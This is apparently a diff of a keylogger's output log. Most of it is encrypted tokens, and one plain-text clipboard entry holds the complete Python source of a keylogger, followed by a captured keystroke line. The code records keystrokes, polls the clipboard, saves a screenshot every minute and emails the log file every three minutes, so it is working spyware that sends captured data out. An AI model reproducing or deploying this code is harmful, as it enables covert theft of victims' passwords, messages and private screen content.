@@ -20,111 +20,111 @@ gAAAAABoVP_8TAaHEbYhRzrQXV2taE4Ak3TBXOVnsEKhZ6OovoHjMnvusE5ArQ3I6asxB9KSlV4hbraw
 gAAAAABoVP__SPqAxrbUVijIrgTYlcu3D21RNVQoqfrSN99bxzJIVBZ3S1IxUQw0NEG5CEIe9A3sGbnTYn_Gecf4XOzgOMspWw==
 gAAAAABoVQABSf2ldVqdPnHU0_PR0bCtjX85qpH8Bi-woEr9zF9edZw7AKlW-NXN4r6robfAHlAvO1BAkMS00x6eTfhtwpCMdg==
 
-[CLIPBOARD]: import os
-import time
-import threading
-import tkinter as tk
-from tkinter import messagebox
-from pynput import keyboard
-import pyperclip
-from PIL import ImageGrab
-from email_util import send_email  # Still supports email
-
-LOG_DIR = "logs"
-SCREENSHOT_DIR = "screenshots"
-LOG_FILE = os.path.join(LOG_DIR, "log.txt")
-
-os.makedirs(LOG_DIR, exist_ok=True)
-os.makedirs(SCREENSHOT_DIR, exist_ok=True)
-
-buffer = ""
-logger_running = False
-threads = []
-
-def write_log(data):
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(data)
-
-def on_press(key):
-    global buffer
-    if not logger_running:
-        return
-    try:
-        buffer += key.char
-    except AttributeError:
-        if key == keyboard.Key.space:
-            buffer += " "
-        elif key == keyboard.Key.enter:
-            buffer += "\n"
-        elif key == keyboard.Key.backspace:
-            buffer = buffer[:-1]
-        else:
-            buffer += f"[{key.name}]"
-
-    if len(buffer) >= 10:
-        write_log(buffer)
-        buffer = ""
-
-def log_clipboard():
-    while logger_running:
-        try:
-            content = pyperclip.paste()
-            write_log(f"\n[CLIPBOARD]: {content}\n")
-        except:
-            pass
-        time.sleep(30)
-
-def capture_screenshots():
-    count = 0
-    while logger_running:
-        screenshot = ImageGrab.grab()
-        screenshot.save(f"{SCREENSHOT_DIR}/screenshot_{count}.png")
-        count += 1
-        time.sleep(60)
-
-def email_logs():
-    while logger_running:
-        time.sleep(180)
-        if os.path.exists(LOG_FILE):
-            send_email("Plaintext Keylogger Report", "Attached is the plain log file.", [LOG_FILE])
-
-def start_logger():
-    global logger_running, threads
-    logger_running = True
-    threads = [
-        threading.Thread(target=log_clipboard, daemon=True),
-        threading.Thread(target=capture_screenshots, daemon=True),
-        threading.Thread(target=email_logs, daemon=True),
-        threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).run(), daemon=True)
-    ]
-    for t in threads:
-        t.start()
-    messagebox.showinfo("Logger", "Keylogger started!")
-
-def stop_logger():
-    global logger_running
-    logger_running = False
-    messagebox.showinfo("Logger", "Keylogger stopped!")
-
-def build_gui():
-    window = tk.Tk()
-    window.title("Plain Keylogger")
-    window.geometry("300x150")
-    window.resizable(False, False)
-
-    label = tk.Label(window, text="Keylogger - Plain Text Mode", fg="blue")
-    label.pack(pady=10)
-
-    start_btn = tk.Button(window, text="Start Logger", command=start_logger, bg="green", fg="white")
-    start_btn.pack(pady=5)
-
-    stop_btn = tk.Button(window, text="Stop Logger", command=stop_logger, bg="red", fg="white")
-    stop_btn.pack(pady=5)
-
-    window.mainloop()
-
-if __name__ == "__main__":
-    build_gui()
+[CLIPBOARD]: import os
+import time
+import threading
+import tkinter as tk
+from tkinter import messagebox
+from pynput import keyboard
+import pyperclip
+from PIL import ImageGrab
+from email_util import send_email  # Still supports email
+
+LOG_DIR = "logs"
+SCREENSHOT_DIR = "screenshots"
+LOG_FILE = os.path.join(LOG_DIR, "log.txt")
+
+os.makedirs(LOG_DIR, exist_ok=True)
+os.makedirs(SCREENSHOT_DIR, exist_ok=True)
+
+buffer = ""
+logger_running = False
+threads = []
+
+def write_log(data):
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(data)
+
+def on_press(key):
+    global buffer
+    if not logger_running:
+        return
+    try:
+        buffer += key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            buffer += " "
+        elif key == keyboard.Key.enter:
+            buffer += "\n"
+        elif key == keyboard.Key.backspace:
+            buffer = buffer[:-1]
+        else:
+            buffer += f"[{key.name}]"
+
+    if len(buffer) >= 10:
+        write_log(buffer)
+        buffer = ""
+
+def log_clipboard():
+    while logger_running:
+        try:
+            content = pyperclip.paste()
+            write_log(f"\n[CLIPBOARD]: {content}\n")
+        except:
+            pass
+        time.sleep(30)
+
+def capture_screenshots():
+    count = 0
+    while logger_running:
+        screenshot = ImageGrab.grab()
+        screenshot.save(f"{SCREENSHOT_DIR}/screenshot_{count}.png")
+        count += 1
+        time.sleep(60)
+
+def email_logs():
+    while logger_running:
+        time.sleep(180)
+        if os.path.exists(LOG_FILE):
+            send_email("Plaintext Keylogger Report", "Attached is the plain log file.", [LOG_FILE])
+
+def start_logger():
+    global logger_running, threads
+    logger_running = True
+    threads = [
+        threading.Thread(target=log_clipboard, daemon=True),
+        threading.Thread(target=capture_screenshots, daemon=True),
+        threading.Thread(target=email_logs, daemon=True),
+        threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).run(), daemon=True)
+    ]
+    for t in threads:
+        t.start()
+    messagebox.showinfo("Logger", "Keylogger started!")
+
+def stop_logger():
+    global logger_running
+    logger_running = False
+    messagebox.showinfo("Logger", "Keylogger stopped!")
+
+def build_gui():
+    window = tk.Tk()
+    window.title("Plain Keylogger")
+    window.geometry("300x150")
+    window.resizable(False, False)
+
+    label = tk.Label(window, text="Keylogger - Plain Text Mode", fg="blue")
+    label.pack(pady=10)
+
+    start_btn = tk.Button(window, text="Start Logger", command=start_logger, bg="green", fg="white")
+    start_btn.pack(pady=5)
+
+    stop_btn = tk.Button(window, text="Stop Logger", command=stop_logger, bg="red", fg="white")
+    stop_btn.pack(pady=5)
+
+    window.mainloop()
+
+if __name__ == "__main__":
+    build_gui()
 
 hi iam devara i[caps_lock][caps_lock]am going to save thigAAAAABoVQS8WDZ6gizxyuPJ9mSMvA6bPdNm_CGruSVYjFbcga7PSEqS9EBMwgTzC2LPA4qbXJq2keZnOG9YUS505tvfMy1O9OYoN69sEPmLm7ZWAPWI5wajQ8WyUf41NM6lTfPzD_s2w6Ps88ivx_YE23V1fo3Se0pWfZ0N-vnbiYflgiQ1iwO8igk5HzwU--Eb4P5Tcj0J3IcPReBPxwwaV_fFNeoVhlILlBm6b1Hrm1oikyOK4RQino8U92SEZWRMaUXjQyIQbAPITusWBTh9CvJQkKFP1-8AV5_s93uwM8I_7saMe7aoUsRPJOao6jNxH_Sp9HUg48qdmtzlwqNb7JpcSumUcoetuEyuzkglNQQDvcF2szDHZ2uWFOjgmfcaK0Uzm2VvRDbOgVXzZHWIs3ngI51s2TUKAb4n8lOfQOhx9lIXp44fUseDaTLZaWwteCvCG2Nid5m_KztLe6oJbLTAepQlfAcO7H8RjXSNzeJZbak7i1axtbYJCnBcbmgKWiqULWQLH8HhRux4mQFvR1v4Q4JZ-U0LCQ8SyUFhXCMGX-zjzZJtDVche9mMrvU_6QROyUjGxdr1QWeb0VabPCC8-NXStAEvWfasW0W2Dbcwzx2m5Z4KOXsAh2Y723oCeExJpi0M8GsXmraLEIEHLZ_sHzPaMG61r3ovwqJsDc1c0KVbCJHZe2P8_Yot2uMTYQ8OGabnsX8BrX6KmLaiYK23eSHAllrxTWOi_Jv8e6sE_FJn6CXsZdBdttz6dkt1_L_WuksVPPLUU_WSRApUDsRFIWPHtPFMQJjeHeMrG0sUowA0SziVEM583SEJABvjpBuiS2oE3KbAc26REmwJYbBLOOGTui--v1_1cdtSHxRbCa7YmZd1RoK9mxF1WDPN1WyEMlDZZi0CpbCgunr6PV2pRIasfvSdzMzaGecgwSgK8_roPLSHQKdDTXOf7NVy1n1428XyMWerQyz1_osoX5PwtAotW6Xd9K5Lt0mq6WAeksjTowEXXZ4TwWUIMzgRo1tcObM6lZaJ5GfpHaqrslABnayd1NRAPiTQM6-s1IEKFyK-V9-j6-yvNjGvgJppwLtx9xyZsNWRG_AZAelOt08MRMiCZ9Qy_JQjP4F2c3xPVyOLxj6xWzaMJehzeadDOCXWi6l02xq4dDPMVQIapdOt2fX7JElEwV_dZdwV_PZFccZthYuTQfkHDVDT6rZMUJb8vMiQ1CP8gaR-qOE7Y_OtFOim8e7KuspXlKf_pVyyTYnsKd6uL9EdhrjBElDLlDHpuu0_zTzM7hoPb3F2XIjrNT7_SR6eRP_SJuNj8dFrh_tjSo8=
 gAAAAABoVQTCkujcOe4A10g2rTq3jjrt0QOiJ9yqJcMjIWcIreubxfV1YPG_9nfRVmbenN4P7XhhgpjD3KiTcwZ81NsqZ75Jlg==
@@ -191,3 +191,18 @@ gAAAAABoVQl217Ujy8ndoL9VNuqY62HGNLR3Z-MkjyDKnm1doAUpncPUtyhJ4PbEFXuvEjTZNSfSNf8r
 gAAAAABoVQl52vpvQ-TlehiOJdC2rSHixc0wFm-YaZBRa36Nkg3ZeMfspOYaplqFhNb-otn3ZKTqVazx_5NQQgasdCUJNali1g==
 gAAAAABoVQl8ZHyJyqVf-3RSv3lDk1XtAKYHMuXTJVSSDUXCXOESrOtPjTGweOaxxOaxRNDswgkTb_5rPDOL_FR8RaK6cP52mA==
 gAAAAABoVQl-oBXQlIjQXsSrL1qe8WxjxFL8_L0w5KW0GoZ5K81P72dlD0vodX0l2LaMGq-TIMNnmxpwCo-UXNNTxHgujheoAw==
+gAAAAABobVDw3FXWa_YQoqzCWuQWPIOjtKK-vvLnlOj7UmtQGbMBPfSUvEDP_fIs-D5fU8Uucezo7S-kzBgzh0pakd0xx4ks-Q==
+gAAAAABobVDyiBEFI8qd3c1Hmmy5294PizSUs0UqxveS49Uf2QZ5Pcj_1A1glHiN1mYivW9ELSjKyKWQRiTjhlVLPlKuC0xinQ==
+gAAAAABobVD9sawzajr3si_eUdLmduHm0pUklaC8g2IDNDT-eY-JFEmpnjarjj0FxY1ZkU2wySlakoLreAzjElqjHx6h49enkA==
+gAAAAABobVECqdXVEkDhBwSTm5Y0tN1z0-QsINgiF_rlnd8u75bqziPXcnp4wBI_NRuwSh3XtE-_fpoVRiuSVHrv7vBLynSZ7A==
+gAAAAABobVEHXkluYnsSspLPQaITBCkXiI918Zt7bLP6Sj3umeFL2ocM0OcSkIozJ2uAgG9V6iJaE-sLIOkhmsa_txVCtfI3rg==
+gAAAAABobVEMGXRugHGo0Vq9XP-Pjb-Iuo2L72cxSvBXTKvxYLQgGFC9TDn26agUQEIb78lK1JlVDrbBlgHvrC2RPpRArHnvcQ==
+gAAAAABobVEOMPBmXSOeOphslGaXfrpmw46dqhRttwxF3P2XIgQS_ysLVmO5hg5pZiEJQr6yqDIeSJuOKgMODJgGUO7PU0g47g==
+gAAAAABobVEQ8v_znRsJnKIV8JrvSEHRIDWBy8gqj1MUwxPi6AlQSLdkYCGdk_FsaSsmpyNTzG2PLTaSl4nEsvK-KclBgMUyAw==
+gAAAAABobVEVQwQ5eST8UvgMvLvOBe189BcQqDk_xUhD6pXlP6Rp-TLRPO4K_v3xNjSH9-U44s6fsGGg5uewQA_tx9mQAjHf-CNeKV1DCyJxpdzheF2NmJs=
+gAAAAABobVEXD8avznuIgFmJzh8c5f1PFpG8Ez0y1PepW6hgKU4tUrxUoIaPVD4t7SVdO4sgD34ecBTY65gb9cqd0rFQuR1jkA==
+gAAAAABobVEfbHR9yEOtW0YMa21XbD43wYfMArVOoDkn14ruefhlu948vj7_1y6-YrgRaj1IuYSNFAkWfj6pxA0_0_pds4rGOQ==
+gAAAAABobVEr4GK9DUUeRe1uLOc3ToYqeioIe7AHrnBxBj9kmytjnA6wgsZYPisRWi-xl-SkbJhE5TDT7xqIyOekwekyQ65ySg==
+gAAAAABobVEsFyJrS_0VZA9X_ZF6ZhYQdl7xAulVMN1Hz6j4VZHZyrN8yiBugz-jMi2K910bLK8e8HF_VEHC4xiblV_ImL7Mqw==
+gAAAAABobVFKyeR4KJy10WJYLtuCsAbvHxC-4WHo8mv7E-toLnSE_CVQCIABH1Z5llFLoqzO0Rs1uaSwSYxVSQh94NWIamQzeg==
+gAAAAABobVFo-DNf4rdO-AL4yoICtx7mgf4ThWi8OEv_RGRRnzof6TXOwJvZg5_rOpBBbEyVogcqxEaIamgxQzL7FUab1c7Grg==
